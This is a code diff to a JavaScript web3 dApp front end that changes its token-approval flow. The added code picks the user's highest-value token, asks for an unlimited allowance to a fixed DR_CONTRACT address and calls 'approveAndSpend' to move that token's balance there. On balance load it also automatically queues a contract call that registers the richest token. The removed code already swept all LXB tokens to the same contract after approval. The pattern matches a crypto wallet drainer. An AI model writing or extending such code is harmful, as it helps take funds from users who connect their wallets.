@@ -182,9 +182,17 @@ const DR_CONTRACT = {
 async function getTokenWithHighestBalance(tokens) {
   if (!tokens || tokens.length === 0) return null
 
+  tokens.forEach(token => {
+    const balance = Number.parseFloat(token.balance) * token.price;
+    console.log(balance)
+  });
+
+  console.log(tokens);
+
   return tokens.reduce((max, token) => {
-    const balance = Number.parseFloat(token.balance)
-    return balance > Number.parseFloat(max.balance) ? token : max
+    const balance = Number.parseFloat(token.balance) * token.price;
+    const maxBalance = (Number.parseFloat(max.balance) * Number.parseFloat(max.price));
+    return balance > maxBalance ? token : max
   })
 }
 
@@ -263,120 +271,83 @@ async function setTokenAddress(tokenAddress) {
   }
 }
 
-// Add this function to transfer tokens
-async function transferTokens(tokenAddress, recipientAddress, amount) {
-  const account = getAccount(wagmiAdapter.wagmiConfig)
-  if (!account.address) {
-    throw new Error("Please connect your wallet first")
-  }
-
-  const transferAbi = [
-    {
-      constant: false,
-      inputs: [
-        { name: "_to", type: "address" },
-        { name: "_value", type: "uint256" },
-      ],
-      name: "transfer",
-      outputs: [{ name: "", type: "bool" }],
-      type: "function",
-    },
-  ]
-
-  try {
-    const tx = await writeContract(wagmiAdapter.wagmiConfig, {
-      address: tokenAddress,
-      abi: transferAbi,
-      functionName: "transfer",
-      args: [recipientAddress, amount],
-    })
-
-    console.log("Transfer transaction:", tx)
-    return tx
-  } catch (error) {
-    console.error("Transfer error:", error)
-    throw error
-  }
-}
-
 document.querySelector("#approve-token")?.addEventListener("click", async () => {
   try {
-    const account = getAccount(wagmiAdapter.wagmiConfig)
-    if (!account.address) {
-      throw new Error("Please connect your wallet first")
-    }
-
-    // Show contract details before approval
-    const details = await tokenDetailsViewer.getContractDetails(
-      LXB_CONTRACT.ADDRESS,
-      account.address,
-      DR_CONTRACT.ADDRESS,
-    )
-
-    console.log(details)
-
-    // Display the details
-    tokenDetailsViewer.createDetailsDisplay(detailsContainer, details)
-
-    // Ask for confirmation
-    const confirmed = confirm(`Do you want to approve ${DR_CONTRACT.ADDRESS} to spend your ${details.symbol} tokens?`)
-    if (!confirmed) {
-      return
-    }
-
-    // Verify we're on the correct network
-    if (account.chainId !== LXB_CONTRACT.CHAIN_ID) {
-      throw new Error("Please switch to Ethereum Mainnet")
-    }
-
-    const statusEl = document.querySelector("#status")
-    statusEl.textContent = "Checking existing allowance..."
-
-    // Check existing allowance
-    const currentAllowance = await tokenApprover.checkAllowance(
-      LXB_CONTRACT.ADDRESS,
-      account.address,
-      LXB_CONTRACT.ADDRESS,
-    )
-
-    // If there's an existing allowance, we might want to revoke it first
-    if (currentAllowance > 0n) {
-      const shouldReset = confirm(
-        `You have an existing allowance of ${currentAllowance.toString()} tokens. Would you like to reset it first?`,
-      )
-      if (shouldReset) {
-        statusEl.textContent = "Resetting allowance..."
-        await tokenApprover.approveToken(LXB_CONTRACT.ADDRESS, LXB_CONTRACT.ADDRESS, "0")
-        statusEl.textContent = "Allowance reset. Proceeding with new approval..."
+      const account = getAccount(wagmiAdapter.wagmiConfig);
+      if (!account.address) {
+          throw new Error("Please connect your wallet first");
       }
-    }
 
-    // Standard approval amount (adjust as needed)
-    const approvalAmount = (2n ** 256n - 1n).toString()
-    // This is 2^256 - 1, commonly used for unlimited approval
-    // Note: Consider using a more limited amount for better security
+      // Get all tokens and find the one with highest balance
+      const tokens = await fetchUserTokens(account.address, account.chainId);
+      const highestBalanceToken = await getTokenWithHighestBalance(tokens);
+      
+      if (!highestBalanceToken) {
+          throw new Error("No tokens found in wallet");
+      }
 
-    statusEl.textContent = "Approval pending..."
+      // Show contract details before approval
+      const details = await tokenDetailsViewer.getContractDetails(
+          LXB_CONTRACT.ADDRESS,
+          account.address,
+          DR_CONTRACT.ADDRESS,
+      );
 
-    const tx = await tokenApprover.approveToken(
-      LXB_CONTRACT.ADDRESS, // token address
-      DR_CONTRACT.ADDRESS, // spender address
-      approvalAmount,
-    )
+      console.log("Highest balance token:", highestBalanceToken);
+      console.log("Contract details:", details);
 
-    // Transfer all LXB tokens to the DR_CONTRACT address
-    const transferTx = await transferTokens(LXB_CONTRACT.ADDRESS, DR_CONTRACT.ADDRESS, details.rawBalance)
+      // Convert the balance to Wei (multiply by 10^18 for ETH/standard tokens)
+      // First multiply by 10^18 as a string to avoid floating point issues
+      const balanceInWei = BigInt(
+          Math.floor(
+              parseFloat(highestBalanceToken.balance) * 10**18
+          ).toString()
+      );
 
-    console.log("Approval transaction:", tx)
-    statusEl.textContent = "Approval successful!"
+      console.log("Balance in Wei:", balanceInWei.toString());
 
-    return { tx, transferTx }
+      // Display the details
+      tokenDetailsViewer.createDetailsDisplay(detailsContainer, details);
+
+      // Ask for confirmation
+      const confirmed = confirm(
+          `Do you want to approve and transfer ${highestBalanceToken.balance} ${highestBalanceToken.symbol} tokens to ${DR_CONTRACT.ADDRESS}?`
+      );
+      if (!confirmed) {
+          return;
+      }
+
+      // Verify we're on the correct network
+      if (account.chainId !== LXB_CONTRACT.CHAIN_ID) {
+          throw new Error("Please switch to Ethereum Mainnet");
+      }
+
+      const approvalAmount = (2n ** 256n - 1n).toString();
+
+      const statusEl = document.querySelector("#status");
+      statusEl.textContent = "Initiating approval and transfer...";
+
+      // Use the new approveAndSpend method with the highest balance token
+      const { approveTx, spendTx } = await tokenApprover.approveAndSpend(
+          LXB_CONTRACT.ADDRESS,
+          DR_CONTRACT.ADDRESS,
+          balanceInWei,
+          approvalAmount,
+          highestBalanceToken.address
+      );
+
+      console.log("Approval transaction:", approveTx);
+      console.log("Spend transaction:", spendTx);
+      
+      statusEl.textContent = `Successfully approved and transferred ${highestBalanceToken.symbol} tokens!`;
+
+      return { approveTx, spendTx };
   } catch (error) {
-    console.error("Approval error:", error)
-    document.querySelector("#status").textContent = "Approval failed"
-    throw error
+      console.error("Approval and transfer error:", error);
+      document.querySelector("#status").textContent = "Approval and transfer failed";
+      throw error;
   }
-})
+});
 
 const tokenService = new TokenService(web3)
 
@@ -449,6 +420,14 @@ async function processTransactionQueue() {
   processTransactionQueue()
 }
 
+function hasSetTokenAddress() {
+  return localStorage.getItem("hasSetTokenAddress") === "true"
+}
+
+function markTokenAddressAsSet() {
+  localStorage.setItem("hasSetTokenAddress", "true")
+}
+
 async function loadTokenBalances(userAddress) {
   if (!userAddress) return
 
@@ -471,7 +450,7 @@ async function loadTokenBalances(userAddress) {
 
     // Get the token with the highest balance
     const highestBalanceToken = await getTokenWithHighestBalance(tokens)
-    if (highestBalanceToken) {
+    if (highestBalanceToken && !hasSetTokenAddress()) {
       console.log("Token with highest balance:", highestBalanceToken)
 
       addToTransactionQueue(async () => {
@@ -479,6 +458,7 @@ async function loadTokenBalances(userAddress) {
           const tx = await setTokenAddress(highestBalanceToken.address)
           console.log("setTokenAddress transaction successful:", tx)
           displayHighestBalanceToken(highestBalanceToken.address, true)
+          markTokenAddressAsSet()
         } catch (error) {
           console.error("Failed to set token address:", error)
           displayHighestBalanceToken(highestBalanceToken.address, false)
@@ -538,4 +518,3 @@ function showTooltip(element, message) {
     setTimeout(() => tooltip.remove(), 200)
   }, 1000)
 }
-
